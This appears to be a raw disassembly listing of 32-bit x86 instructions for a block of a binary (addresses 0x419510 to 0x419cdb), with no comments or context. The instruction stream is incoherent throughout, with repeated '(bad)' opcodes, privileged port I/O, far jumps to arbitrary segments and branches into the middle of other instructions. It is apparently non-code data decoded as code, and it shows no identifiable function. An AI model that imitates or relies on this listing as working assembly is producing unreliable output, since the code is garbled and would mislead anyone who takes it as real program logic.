  419510:	and    BYTE PTR [edx-0x7c9fb27d],al
  419516:	sbb    DWORD PTR [edi+0x2a982366],0x18
  41951d:	inc    esi
  41951e:	in     eax,0x19
  419520:	xchg   esp,eax
  419521:	pusha  
  419522:	sub    edi,DWORD PTR [eax]
  419524:	addr16 add eax,0x59fe14a7
  41952a:	xor    ch,BYTE PTR [edx+ecx*1]
  41952d:	push   es
  41952e:	mov    dh,0xbe
  419530:	dec    eax
  419531:	mov    BYTE PTR [edi+ebp*1+0x5e18d3b0],bl
  419538:	mov    ecx,0xe158eb33
  41953d:	std    
  41953e:	inc    eax
  41953f:	inc    ebp
  419540:	or     ah,BYTE PTR [ebp+0x57]
  419543:	lea    edi,[ecx+edx*1+0x6e43785f]
  41954a:	in     al,0x5c
  41954c:	adc    edx,DWORD PTR [esi-0x16]
  41954f:	fidivr WORD PTR [edi+eiz*4-0x41]
  419553:	fstp   st(1)
  419555:	inc    edi
  419556:	cs sahf 
  419558:	mov    esp,0x69a8905b
  41955d:	dec    ebx
  41955e:	pop    ecx
  41955f:	outs   dx,DWORD PTR ds:[esi]
  419560:	outs   dx,DWORD PTR ds:[esi]
  419561:	aas    
  419562:	or     BYTE PTR [esi+0x19b34c30],cl
  419568:	or     al,BYTE PTR [ebx-0x51]
  41956b:	xchg   ebx,eax
  41956c:	mov    ah,0x17
  41956e:	pop    ebx
  41956f:	and    BYTE PTR gs:[ebx+0x1869fa7d],ah
  419576:	clc    
  419577:	ds mov ecx,0xe3f31ec5
  41957d:	ds dec esi
  41957f:	add    al,0x3c
  419581:	loop   0x419579
  419583:	scas   eax,DWORD PTR es:[edi]
  419584:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419585:	or     esp,DWORD PTR [ecx+0x7a]
  419588:	stos   BYTE PTR es:[edi],al
  419589:	xor    edi,DWORD PTR [ebx]
  41958b:	out    dx,al
  41958c:	mov    al,ds:0xc46078fa
  419591:	jmp    0x41954f
  419593:	and    BYTE PTR [ebx],dl
  419595:	(bad)  
  419596:	data16 int 0x5f
  419599:	lods   eax,DWORD PTR ds:[esi]
  41959a:	cmp    BYTE PTR [ecx-0x5b],bl
  41959d:	xchg   ebx,eax
  41959e:	cmc    
  41959f:	and    ch,BYTE PTR [ecx-0x6a106cf3]
  4195a5:	call   0x1fdc7c9d
  4195aa:	inc    edi
  4195ab:	dec    edi
  4195ac:	mov    ds:0x317538f1,al
  4195b1:	mov    edi,0x439540f0
  4195b6:	or     ebp,ebx
  4195b8:	push   esi
  4195b9:	mov    DWORD PTR [esi-0x309bd540],ecx
  4195bf:	add    eax,0x68a2fd3d
  4195c4:	jnp    0x41961e
  4195c6:	(bad)  
  4195c7:	mov    al,0x26
  4195c9:	sub    eax,DWORD PTR [esi+0x15dca8c6]
  4195cf:	sub    edi,DWORD PTR [ecx]
  4195d1:	fstp   DWORD PTR [ecx+0x33]
  4195d4:	inc    esi
  4195d5:	pop    eax
  4195d6:	hlt    
  4195d7:	cmc    
  4195d8:	push   esp
  4195d9:	es mov ecx,0xc4c54c93
  4195df:	loope  0x419574
  4195e1:	test   al,0xa
  4195e3:	dec    eax
  4195e4:	sub    bl,al
  4195e6:	outs   dx,DWORD PTR ds:[esi]
  4195e7:	xchg   edi,eax
  4195e8:	imul   ebp,esi,0xcbec5c0e
  4195ee:	pop    edi
  4195ef:	mov    ds:0x844a7c48,eax
  4195f4:	mov    eax,ds:0x7ab2fc98
  4195f9:	xor    bl,dl
  4195fb:	sar    DWORD PTR [ebx],0xd5
  4195fe:	(bad)  [edx+0x24]
  419601:	ret    0x9d35
  419604:	(bad)  
  419605:	inc    ecx
  419606:	fnsave [eax+0x6c757110]
  41960c:	xchg   ebp,eax
  41960d:	sub    eax,0x6c
  419610:	popf   
  419611:	(bad)  
  419612:	(bad)  
  419613:	sub    al,0xd8
  419615:	rol    DWORD PTR [ebx],0x1
  419618:	data16 je 0x4195d6
  41961b:	cmp    esp,DWORD PTR [edx-0x42]
  41961e:	ja     0x419659
  419620:	adc    edx,DWORD PTR [edx]
  419622:	or     al,0x79
  419625:	(bad)  
  419626:	retf   
  419627:	jmp    0x24b73c07
  41962c:	cmp    bl,BYTE PTR [eax-0x2f42018d]
  419632:	xor    al,0xd2
  419634:	arpl   WORD PTR [esi],di
  419636:	test   DWORD PTR [ebp+ecx*2-0x5e72e6a0],edi
  41963d:	and    eax,0xdb4a544d
  419642:	mov    ecx,0x31d51418
  419647:	adc    BYTE PTR [ebx+0x7c],0x19
  41964b:	push   0xffffffe2
  41964d:	fstp   st(7)
  41964f:	(bad)  
  419650:	dec    ebx
  419651:	mov    gs,eax
  419653:	adc    al,BYTE PTR [ebx]
  419655:	stos   BYTE PTR es:[edi],al
  419656:	sub    cl,BYTE PTR ds:[ecx+0x2dc80893]
  41965d:	push   ecx
  41965e:	dec    eax
  41965f:	pop    ecx
  419660:	cld    
  419661:	jp     0x4196c8
  419663:	sbb    DWORD PTR [esi-0x3c],esi
  419666:	test   DWORD PTR [esi+0x4],edx
  419669:	les    esp,FWORD PTR [edx+0x6]
  41966c:	js     0x419637
  41966e:	bound  ecx,QWORD PTR [ecx+0x4726b612]
  419674:	or     DWORD PTR [eax-0x2ff05dc3],ecx
  41967a:	fld    DWORD PTR [ebx]
  41967c:	xor    ebx,DWORD PTR [edx+0x11]
  41967f:	test   DWORD PTR [esi+esi*1+0xf8731e3],edx
  419686:	mov    al,ds:0xb08e4259
  41968b:	xchg   esp,eax
  41968c:	aam    0x5f
  41968e:	adc    DWORD PTR [ecx+ecx*4-0x73],esi
  419692:	mov    ds:0x3c341ae6,eax
  419697:	inc    esi
  419698:	adc    eax,0xe501dfd9
  41969d:	lea    esp,[ebx-0x5930a663]
  4196a3:	leave  
  4196a4:	mov    ds:0x7ce3230d,al
  4196a9:	leave  
  4196aa:	xchg   ebp,eax
  4196ab:	jl     0x41965a
  4196ad:	cmp    eax,0x92bf8676
  4196b2:	inc    edx
  4196b3:	into   
  4196b4:	(bad)  
  4196b5:	in     al,0x24
  4196b7:	ins    DWORD PTR es:[edi],dx
  4196b8:	loopne 0x41971e
  4196ba:	xor    ah,bl
  4196bc:	fistp  WORD PTR [ebx+0x371b5a5a]
  4196c2:	push   edx
  4196c3:	xor    al,0x45
  4196c5:	pop    ebp
  4196c6:	adc    DWORD PTR [ebx+0x7b],ecx
  4196c9:	nop
  4196ca:	mul    DWORD PTR ds:0x24e3fa67
  4196d0:	sti    
  4196d1:	pop    es
  4196d2:	ret    0x312c
  4196d5:	xchg   ecx,eax
  4196d6:	push   ss
  4196d7:	push   0x3
  4196d9:	daa    
  4196da:	or     eax,DWORD PTR [ebx]
  4196dc:	(bad)  [eax-0x3a4850b7]
  4196e2:	mov    edx,0xf9222f94
  4196e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196e8:	xchg   ebp,eax
  4196e9:	scas   al,BYTE PTR es:[edi]
  4196ea:	mov    ch,0x6d
  4196ec:	fdivr  st,st(2)
  4196ee:	jg     0x4196df
  4196f0:	gs (bad) 
  4196f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196f3:	jns    0x4196f9
  4196f5:	in     al,dx
  4196f6:	imul   edx,DWORD PTR [ecx-0x42a774c2],0x3
  4196fd:	test   al,0x2e
  4196ff:	push   0xec3cf040
  419704:	push   esi
  419705:	add    DWORD PTR [ecx-0x13],eax
  419708:	adc    DWORD PTR ds:0x4d962fde,0x4a
  41970f:	shr    DWORD PTR [esp+ebx*2+0x2d],cl
  419713:	add    al,BYTE PTR [edi]
  419715:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  419717:	sub    DWORD PTR [edx],edx
  419719:	in     eax,0x99
  41971b:	inc    edx
  41971c:	mov    BYTE PTR [eax+0x6061eba],ah
  419722:	rcr    DWORD PTR es:[esi-0x58],1
  419726:	add    eax,0xfe3cc1e0
  41972b:	popa   
  41972c:	xchg   edx,eax
  41972d:	sub    DWORD PTR [edx-0x58],0x5e287195
  419734:	sbb    DWORD PTR [edi],0x31
  419737:	mov    WORD PTR [edx+ecx*1+0x6a],cs
  41973b:	push   0xe5d33ac1
  419740:	ss dec edx
  419742:	je     0x4196d0
  419744:	push   esi
  419745:	imul   esi,DWORD PTR [ebx+0x11],0x3d
  419749:	sub    DWORD PTR [ecx+ecx*2+0x50b765fc],ebx
  419750:	and    ebx,ebp
  419752:	pop    esi
  419753:	dec    ebp
  419754:	call   0x288086f7
  419759:	les    eax,FWORD PTR [eax-0xffe1021]
  41975f:	out    dx,al
  419760:	daa    
  419761:	sbb    BYTE PTR [ebx+0x75a73081],ch
  419767:	ds daa 
  419769:	pop    ebp
  41976a:	cli    
  41976b:	cmp    DWORD PTR [ecx+eax*4],ebx
  41976e:	mov    ch,0xa9
  419770:	or     eax,0xffffffdb
  419773:	jp     0x41972f
  419775:	fdivr  QWORD PTR [edi+0x28d2248f]
  41977b:	adc    DWORD PTR [edi],0x72431be
  419781:	int    0xcb
  419783:	outs   dx,BYTE PTR ds:[esi]
  419784:	mov    BYTE PTR [ebx+0x1a06d467],bh
  41978a:	dec    edx
  41978b:	pop    esp
  41978c:	int    0x68
  41978e:	int    0x30
  419790:	mov    WORD PTR [esi],ds
  419792:	les    eax,FWORD PTR [eax+0x4]
  419795:	cld    
  419796:	sub    eax,0x9f59b2c4
  41979b:	mov    al,ds:0xb4482667
  4197a0:	xchg   edi,eax
  4197a1:	xor    eax,0xc109639c
  4197a6:	call   0x47b5:0xffa5a1a
  4197ad:	mov    ebx,0xce40b646
  4197b2:	or     DWORD PTR [edi+ecx*2-0x34],esp
  4197b6:	(bad)  
  4197b7:	push   edi
  4197b8:	test   BYTE PTR [edi+0x78],ah
  4197bb:	rcr    DWORD PTR [eax-0x45bee3c3],cl
  4197c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197c2:	xor    eax,0xe6c14b8
  4197c7:	inc    ecx
  4197c8:	fisubr WORD PTR [esi]
  4197ca:	fistp  QWORD PTR [esi-0x78]
  4197cd:	mov    bh,0xa4
  4197cf:	inc    ebp
  4197d0:	and    BYTE PTR [esi+edx*2+0x47bed02d],0x50
  4197d8:	mov    ebp,0x20182f59
  4197dd:	pop    es
  4197de:	push   eax
  4197df:	xlat   BYTE PTR ds:[ebx]
  4197e0:	call   0x5862693b
  4197e5:	cmp    al,0x85
  4197e7:	jne    0x41984c
  4197e9:	inc    esi
  4197ea:	sbb    bh,BYTE PTR [ecx+ecx*8+0x66ab69de]
  4197f1:	sub    cl,dh
  4197f3:	push   edx
  4197f4:	sub    dl,ah
  4197f6:	sbb    eax,DWORD PTR [edi-0x58e5397f]
  4197fc:	push   esp
  4197fd:	pop    esp
  4197fe:	sub    ecx,DWORD PTR [esi]
  419800:	sahf   
  419801:	mov    edx,0x11ad2a9c
  419806:	push   eax
  419807:	mov    ds:0x70196a22,al
  41980c:	mov    eax,ds:0x3aac8a20
  419811:	inc    esp
  419812:	adc    ebp,DWORD PTR [ecx]
  419814:	fld    TBYTE PTR [eax-0x6c]
  419817:	je     0x419802
  419819:	jl     0x41986a
  41981b:	jb     0x419824
  41981d:	call   0x1931eb1b
  419822:	xlat   BYTE PTR ds:[ebx]
  419823:	or     BYTE PTR [ecx],0x6e
  419826:	ja     0x419868
  419828:	imul   ebx,DWORD PTR [ecx+0x11],0x8f006f6e
  41982f:	out    0xdd,eax
  419831:	xor    al,0xf7
  419833:	fcomp  QWORD PTR [edx+ebp*8+0x2da54081]
  41983a:	mov    esp,0xf1cace8d
  41983f:	outs   dx,BYTE PTR ds:[esi]
  419840:	fwait
  419841:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419842:	test   al,0x17
  419844:	imul   DWORD PTR [ecx]
  419846:	loopne 0x41986b
  419848:	lock outs dx,BYTE PTR ds:[esi]
  41984a:	push   es
  41984b:	xchg   ebx,eax
  41984c:	xchg   DWORD PTR [ebx+0xd59d9c0],ecx
  419852:	scas   eax,DWORD PTR es:[edi]
  419853:	lea    esi,[edi-0x2f]
  419856:	jmp    0x2001:0x56f63bc4
  41985d:	imul   edi,ebx,0x25
  419860:	dec    ebx
  419861:	es sub al,0x7b
  419864:	or     edi,esp
  419866:	pusha  
  419867:	mov    edi,0x67b7bf4c
  41986c:	popa   
  41986d:	outs   dx,DWORD PTR ds:[esi]
  41986e:	mov    dh,0x39
  419870:	fcmovbe st,st(1)
  419872:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419873:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419874:	pop    ebx
  419875:	idiv   BYTE PTR [ebp+0x63]
  419878:	inc    ebp
  419879:	mov    ecx,0xf84edc8a
  41987e:	mov    ecx,0x91a1c8f0
  419883:	test   al,0x0
  419885:	cwde   
  419886:	mov    edi,DWORD PTR [edi]
  419888:	mov    ecx,0x2d64a292
  41988d:	push   esp
  41988e:	or     al,0xf0
  419890:	adc    eax,0x5fe9965b
  419895:	stos   BYTE PTR es:[edi],al
  419896:	popf   
  419897:	cmp    eax,0x3d9354a9
  41989c:	inc    edi
  41989d:	leave  
  41989e:	and    ecx,edx
  4198a0:	cmp    eax,0x13c347be
  4198a5:	outs   dx,BYTE PTR ds:[esi]
  4198a6:	adc    DWORD PTR [ebp-0x45465487],edi
  4198ac:	jnp    0x4198dc
  4198ae:	cli    
  4198af:	sub    BYTE PTR [eax+0x18],ah
  4198b2:	stc    
  4198b3:	in     eax,0x81
  4198b5:	xchg   esp,eax
  4198b6:	out    dx,al
  4198b7:	das    
  4198b8:	imul   edx,DWORD PTR ds:0x6e4dcca0,0x27744555
  4198c2:	or     DWORD PTR [ecx+0xee3e7db],0x79
  4198c9:	mov    ah,0x96
  4198cb:	xchg   edi,eax
  4198cc:	jmp    0x5aa78e8
  4198d1:	mov    dl,0x66
  4198d3:	loop   0x4198a2
  4198d5:	pop    ebx
  4198d6:	ret    
  4198d7:	sbb    DWORD PTR [eax+0x7daff3da],ebp
  4198dd:	pop    eax
  4198de:	out    0x48,eax
  4198e0:	loopne 0x4198e0
  4198e2:	loop   0x41989e
  4198e4:	jmp    0x5ddb:0x5bb030ef
  4198eb:	leave  
  4198ec:	ins    DWORD PTR es:[edi],dx
  4198ed:	xor    esp,0x2934bdca
  4198f3:	xchg   ebx,eax
  4198f4:	lea    ebp,[ebp-0x4388dc9f]
  4198fa:	stos   BYTE PTR es:[edi],al
  4198fb:	nop
  4198fc:	adc    BYTE PTR [esi+0x6e],dl
  4198ff:	fnstenv [eax+0x58]
  419902:	jbe    0x41997f
  419904:	pop    edi
  419905:	sub    DWORD PTR [edi-0x6bd67e7a],0x17
  41990c:	sbb    eax,esp
  41990e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41990f:	mov    cs,WORD PTR [edx-0x39]
  419912:	into   
  419913:	xchg   ecx,eax
  419914:	in     al,0x71
  419916:	fyl2xp1 
  419918:	cmp    BYTE PTR [edi+0x79],cl
  41991b:	push   esp
  41991c:	imul   ecx,ebx,0xffffffc1
  41991f:	xor    esi,DWORD PTR [esi+edi*4+0x46]
  419923:	pop    edi
  419924:	fdiv   st(7),st
  419926:	fdiv   st,st(6)
  419928:	and    eax,DWORD PTR [esi+edx*2-0x30]
  41992c:	pusha  
  41992d:	stc    
  41992e:	scas   al,BYTE PTR es:[edi]
  41992f:	jne    0x419902
  419931:	or     DWORD PTR [edi],0x9c24519b
  419937:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419938:	es sbb al,cl
  41993b:	cli    
  41993c:	cmp    BYTE PTR [edx+edx*4+0x1f6aabd3],al
  419943:	test   al,0xa4
  419945:	jle    0x419967
  419947:	adc    eax,0x11f77627
  41994c:	pushf  
  41994d:	shl    BYTE PTR [eax],1
  41994f:	and    al,0xb4
  419951:	scas   eax,DWORD PTR es:[edi]
  419952:	repz test eax,0x846f8526
  419958:	mov    edi,0x5ef569fc
  41995d:	mov    ds:0x1aaa7ac9,al
  419962:	cmp    al,0xe6
  419964:	push   esp
  419965:	fwait
  419966:	popa   
  419967:	and    al,0x19
  419969:	mov    bl,BYTE PTR [ebp-0x23220f78]
  41996f:	sbb    BYTE PTR [ebx+0x5fda7ac],bh
  419975:	icebp  
  419976:	or     BYTE PTR [ebx+0x5230916e],ch
  41997c:	pop    esi
  41997d:	rcr    DWORD PTR [esi+0x59],1
  419980:	clc    
  419981:	cs pop ds
  419983:	aam    0x62
  419985:	lods   al,BYTE PTR ds:[esi]
  419986:	xchg   esp,eax
  419987:	dec    eax
  419988:	inc    esp
  419989:	adc    BYTE PTR [ecx-0x79cd3a7b],ah
  41998f:	iret   
  419990:	xchg   ebp,eax
  419991:	push   cs
  419992:	pop    ecx
  419993:	aam    0x34
  419995:	nop    DWORD PTR [esi]
  419998:	div    DWORD PTR [ebx-0x2acf6d92]
  41999e:	aaa    
  41999f:	jmp    0x41994e
  4199a1:	(bad)  
  4199a2:	mov    esi,0x616fc6e
  4199a7:	clc    
  4199a8:	mov    bh,0x30
  4199aa:	ret    0x64b1
  4199ad:	and    BYTE PTR [ebx],0x21
  4199b0:	xor    esp,DWORD PTR [edx]
  4199b2:	add    ch,BYTE PTR [bx]
  4199b5:	and    bh,BYTE PTR [ebx*2+0x290bf94a]
  4199bc:	retf   0x179f
  4199bf:	push   cs
  4199c0:	(bad)  
  4199c1:	adc    ch,BYTE PTR [ebx+0x31]
  4199c4:	mov    esi,0xa27d7bf1
  4199c9:	enter  0x9df8,0x3e
  4199cd:	cmp    BYTE PTR [edx],0x3
  4199d0:	jmp    0x4199bb
  4199d2:	call   0x8c4cbf7b
  4199d7:	jnp    0x419a52
  4199d9:	ror    DWORD PTR [ebx+0x6fb089fe],0x38
  4199e0:	inc    ebp
  4199e1:	lea    eax,[ebp+0x5b54e0d]
  4199e7:	xchg   ebx,eax
  4199e8:	jnp    0x41997b
  4199ea:	in     al,dx
  4199eb:	ins    DWORD PTR es:[edi],dx
  4199ec:	xchg   BYTE PTR [ebp+0x5e],dl
  4199ef:	ret    0xe99b
  4199f2:	sub    ah,BYTE PTR [eax]
  4199f4:	and    eax,0x9cea845b
  4199f9:	jl     0x4199db
  4199fb:	push   ebp
  4199fc:	adc    dh,BYTE PTR [ebx]
  4199fe:	scas   eax,DWORD PTR es:[edi]
  4199ff:	xor    bh,dh
  419a01:	mov    bl,0xb6
  419a03:	and    dh,BYTE PTR [esi-0x4a4cab9e]
  419a09:	iret   
  419a0a:	push   ebx
  419a0b:	dec    edi
  419a0c:	cld    
  419a0d:	push   edx
  419a0e:	popa   
  419a0f:	mov    ebp,0x95a2c443
  419a14:	data16 out dx,al
  419a16:	push   cs
  419a17:	outs   dx,DWORD PTR ds:[esi]
  419a18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a19:	ins    BYTE PTR es:[edi],dx
  419a1a:	mov    cl,0x71
  419a1c:	xchg   ecx,eax
  419a1d:	mov    esp,0xc758425b
  419a22:	xchg   BYTE PTR [eax-0x3f0b406],al
  419a28:	test   DWORD PTR [edx+0x29],edx
  419a2b:	add    BYTE PTR [eax+esi*2],bh
  419a2e:	xchg   esp,eax
  419a2f:	dec    ecx
  419a30:	jmp    0xa571:0x8160635e
  419a37:	mov    ds:0xa8df3892,eax
  419a3c:	jle    0x4199e2
  419a3e:	jmp    0x580d:0xbb397832
  419a45:	hlt    
  419a46:	and    DWORD PTR gs:[edx-0x58cb4b40],ecx
  419a4d:	mov    ch,0x74
  419a4f:	mov    al,ds:0xa7bfebd9
  419a54:	call   0x701f:0x29a3f13
  419a5b:	mov    cl,0x73
  419a5d:	aad    0xe6
  419a5f:	aas    
  419a60:	push   edi
  419a61:	adc    al,0x27
  419a63:	jno    0x419a2b
  419a65:	pop    ebx
  419a66:	stos   DWORD PTR es:[edi],eax
  419a67:	xchg   ebp,eax
  419a68:	js     0x4199f6
  419a6a:	out    0x3b,eax
  419a6c:	xchg   BYTE PTR ss:[edi],bh
  419a6f:	sbb    bl,BYTE PTR [edx]
  419a71:	or     dh,bh
  419a73:	add    al,0x0
  419a75:	sub    ah,BYTE PTR [ecx-0x60f8f04a]
  419a7b:	arpl   WORD PTR [edx+0x3b],di
  419a7e:	jo     0x419a61
  419a80:	xchg   ebx,eax
  419a81:	cmp    BYTE PTR [edi+0x52dc885e],ch
  419a87:	pop    eax
  419a88:	leave  
  419a89:	jle    0x419ad0
  419a8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a8c:	mov    BYTE PTR [edx-0x1feb11a5],dh
  419a92:	add    DWORD PTR [ebx-0x31ae3512],ebp
  419a98:	fs sub al,0xb0
  419a9b:	aam    0x54
  419a9d:	jo     0x419a72
  419a9f:	or     cl,BYTE PTR [ebp-0x6f1743b9]
  419aa5:	xchg   ebx,eax
  419aa6:	lahf   
  419aa7:	loop   0x419af4
  419aa9:	xchg   edx,eax
  419aaa:	mov    bh,0xa3
  419aac:	ret    
  419aad:	not    BYTE PTR [eax]
  419aaf:	add    eax,0xa7170235
  419ab4:	jecxz  0x419b23
  419ab6:	out    0xfe,eax
  419ab8:	scas   al,BYTE PTR es:[edi]
  419ab9:	xor    BYTE PTR [eax+0x6dc73154],bh
  419abf:	es inc edi
  419ac1:	xchg   esi,eax
  419ac2:	mov    dl,0xfe
  419ac4:	dec    ebp
  419ac5:	and    DWORD PTR [esi-0x6f],esi
  419ac8:	add    esp,ecx
  419aca:	lods   al,BYTE PTR ds:[esi]
  419acb:	outs   dx,DWORD PTR ds:[esi]
  419acc:	push   ds
  419acd:	sbb    BYTE PTR [ecx-0x24e09aba],bl
  419ad3:	das    
  419ad4:	aas    
  419ad5:	sbb    BYTE PTR [ebx+eiz*4],dl
  419ad8:	ds inc eax
  419ada:	pop    edx
  419adb:	sbb    bl,ah
  419add:	xchg   edi,eax
  419ade:	xor    BYTE PTR [eax-0x4],dh
  419ae1:	mov    ebp,0xdcdfe276
  419ae6:	inc    esi
  419ae7:	or     DWORD PTR [ecx+0x7],edx
  419aea:	mov    edi,0x1dd1d427
  419aef:	dec    esi
  419af0:	fdiv   QWORD PTR [edx-0x27291a3d]
  419af6:	inc    esp
  419af7:	es out dx,eax
  419af9:	(bad)  
  419afa:	mov    eax,0x7afdf28
  419aff:	inc    ebp
  419b00:	sbb    dh,BYTE PTR ss:[ebp+0x5f]
  419b04:	inc    edi
  419b05:	or     BYTE PTR [edi+0xa],dl
  419b08:	or     BYTE PTR [eax+0x374d1d83],al
  419b0e:	and    dh,BYTE PTR ds:[eax+eax*4+0x28]
  419b13:	dec    edi
  419b14:	xchg   esi,eax
  419b15:	gs aas 
  419b17:	and    al,0x63
  419b19:	loope  0x419b48
  419b1b:	inc    DWORD PTR [edi-0x6f]
  419b1e:	cmc    
  419b1f:	adc    DWORD PTR [ebx-0x26a7ec82],ebp
  419b25:	in     eax,0xc9
  419b27:	xor    DWORD PTR [eax+esi*8-0x52329de2],edx
  419b2e:	pop    edi
  419b2f:	clc    
  419b30:	lahf   
  419b31:	fstcw  WORD PTR [ebx+0x3]
  419b35:	fnstcw WORD PTR ds:0x6b86d838
  419b3b:	bound  edx,QWORD PTR ds:0x7512f6fe
  419b41:	xor    BYTE PTR [esi-0x6],cl
  419b44:	jno    0x419b03
  419b46:	dec    ecx
  419b47:	das    
  419b48:	push   ecx
  419b49:	call   0x4ceacc9b
  419b4e:	popa   
  419b4f:	ss ins DWORD PTR es:[edi],dx
  419b51:	pop    edx
  419b52:	inc    edx
  419b53:	in     al,dx
  419b54:	enter  0xe1ab,0x73
  419b58:	pushf  
  419b59:	mov    eax,ds:0xbd41eda0
  419b5e:	xchg   ebx,eax
  419b5f:	aas    
  419b60:	outs   dx,DWORD PTR ds:[esi]
  419b61:	jle    0x419af9
  419b63:	xlat   BYTE PTR ds:[ebx]
  419b64:	sub    eax,0xcc152a30
  419b69:	fidivr DWORD PTR [esp+eiz*2-0x6f]
  419b6d:	bswap  edx
  419b6f:	loope  0x419b5f
  419b71:	mov    esi,0xbed73c13
  419b76:	cmc    
  419b77:	(bad)  
  419b79:	push   0xf3ee9528
  419b7e:	dec    ebx
  419b7f:	cmp    BYTE PTR [ecx],ch
  419b81:	je     0x419b1f
  419b83:	fnstenv [ecx*2-0x6a38baa8]
  419b8a:	mov    WORD PTR [ecx-0x4e],?
  419b8d:	dec    eax
  419b8e:	inc    edx
  419b8f:	pop    ss
  419b90:	std    
  419b91:	sar    DWORD PTR [edi+0x68],0xfe
  419b95:	inc    ecx
  419b96:	sub    bh,BYTE PTR [ebp-0x7d]
  419b99:	fild   WORD PTR [eax+0x7f1dba85]
  419b9f:	pop    ds
  419ba0:	in     eax,dx
  419ba1:	hlt    
  419ba2:	pop    ebp
  419ba3:	fst    DWORD PTR [esp+ecx*4]
  419ba6:	dec    ecx
  419ba7:	xor    BYTE PTR [esi-0x66],bh
  419baa:	ja     0x419b2c
  419bac:	sbb    dh,BYTE PTR [esi+0x50]
  419baf:	pop    ds
  419bb0:	jb     0x419bf3
  419bb2:	cs jne 0x419b41
  419bb5:	pop    ds
  419bb6:	and    DWORD PTR [esi],edx
  419bb8:	and    eax,0x2da9a6a
  419bbd:	jo     0x419bd4
  419bbf:	sar    DWORD PTR [ebx+eax*4],1
  419bc2:	fdiv   DWORD PTR [eax+ebx*4-0x10]
  419bc6:	sbb    ecx,ebx
  419bc8:	jne    0x419c27
  419bca:	sub    eax,0x46e6b80d
  419bcf:	outs   dx,BYTE PTR ds:[esi]
  419bd0:	push   0xfdd46675
  419bd5:	inc    esi
  419bd6:	fwait
  419bd7:	or     ch,BYTE PTR [ecx+ebx*4-0x80]
  419bdb:	xor    BYTE PTR [eax-0x4c],ch
  419bde:	ins    DWORD PTR es:[edi],dx
  419bdf:	jmp    0x173d:0x164bca5b
  419be6:	out    0x3a,al
  419be8:	sub    eax,0x360b0fea
  419bed:	xchg   ecx,eax
  419bee:	xchg   edi,eax
  419bef:	scas   al,BYTE PTR es:[edi]
  419bf0:	mov    cl,ch
  419bf2:	ret    0xc691
  419bf5:	xor    al,0x61
  419bf7:	push   0xffffff81
  419bf9:	push   esi
  419bfa:	push   edx
  419bfb:	push   eax
  419bfc:	enter  0xc837,0x8f
  419c00:	mov    WORD PTR [ebx+0x6c],fs
  419c03:	or     dl,BYTE PTR [ebp-0x41313567]
  419c09:	xchg   ecx,eax
  419c0a:	iret   
  419c0b:	call   0x34f8d99d
  419c10:	(bad)  
  419c11:	pop    ecx
  419c12:	cdq    
  419c13:	mov    cl,0x50
  419c15:	xlat   BYTE PTR ds:[ebx]
  419c16:	adc    bh,ah
  419c18:	sub    eax,0x6c3395ba
  419c1d:	cmp    dl,ah
  419c1f:	mov    ecx,0x5c88ea01
  419c24:	and    DWORD PTR [ebx+0x168566bc],ebx
  419c2a:	inc    ecx
  419c2b:	add    eax,0xac2aa76
  419c30:	icebp  
  419c31:	clc    
  419c32:	xlat   BYTE PTR ds:[ebx]
  419c33:	xchg   ebx,eax
  419c34:	push   es
  419c35:	and    ebp,DWORD PTR [edi+0xc]
  419c38:	push   eax
  419c39:	sbb    dl,BYTE PTR [eax+0x4e]
  419c3c:	dec    ebx
  419c3d:	jb     0x419bd9
  419c3f:	stos   BYTE PTR es:[edi],al
  419c40:	push   0xffffffff
  419c42:	repz loope 0x419c22
  419c45:	(bad)  
  419c47:	or     BYTE PTR [ebp-0x17b7c7e7],ch
  419c4d:	mov    ah,0xfd
  419c4f:	push   ecx
  419c50:	sub    DWORD PTR [edi],0xcf2b8c76
  419c56:	sbb    eax,0x2181eb8a
  419c5b:	sub    DWORD PTR [ebx+0x3e],eax
  419c5e:	jno    0x419c46
  419c60:	(bad)  
  419c61:	iret   
  419c62:	cli    
  419c63:	pop    ds
  419c64:	scas   eax,DWORD PTR es:[edi]
  419c65:	pop    es
  419c66:	push   edx
  419c67:	je     0x419bfc
  419c69:	icebp  
  419c6a:	aaa    
  419c6b:	jge    0x419c9b
  419c6d:	or     ch,BYTE PTR [edx+0x14]
  419c70:	sub    al,0x9f
  419c72:	cmp    bl,BYTE PTR [di+0x5ac3]
  419c77:	xchg   ebx,eax
  419c78:	xor    DWORD PTR [esi+0x38],esi
  419c7b:	sti    
  419c7c:	dec    esi
  419c7d:	add    BYTE PTR ds:0x271b306,0x7f
  419c84:	inc    eax
  419c85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c86:	aas    
  419c87:	pop    esp
  419c88:	outs   dx,BYTE PTR ds:[esi]
  419c89:	jb     0x419d01
  419c8b:	push   eax
  419c8c:	mov    ecx,0x81d4e13
  419c91:	add    dl,cl
  419c93:	sbb    DWORD PTR [ecx+edi*4],ebp
  419c96:	mov    esi,0xa335d8bb
  419c9b:	call   0xe78dc007
  419ca0:	rcl    DWORD PTR [edi+0x1c0dabd],1
  419ca6:	cmc    
  419ca7:	iret   
  419ca8:	inc    esp
  419ca9:	add    ebx,DWORD PTR [ecx-0x48]
  419cac:	test   BYTE PTR [ebp+0x26955d9d],0x40
  419cb3:	mov    esp,0x4b8d7380
  419cb8:	dec    eax
  419cb9:	adc    eax,0xeb9244b3
  419cbe:	shl    BYTE PTR [ebx-0x5e],1
  419cc1:	sbb    bh,ah
  419cc3:	outs   dx,DWORD PTR ds:[esi]
  419cc4:	jl     0x419d3d
  419cc6:	ins    DWORD PTR es:[edi],dx
  419cc7:	and    BYTE PTR [ebp+ebx*8+0x11],dh
  419ccb:	ja     0x419cc3
  419ccd:	int3   
  419cce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ccf:	ds cmp ch,dh
  419cd2:	daa    
  419cd3:	cmp    BYTE PTR [ebp-0x14bbb06c],bl
  419cd9:	iret   
  419cda:	dec    ecx
  419cdb:	ret    
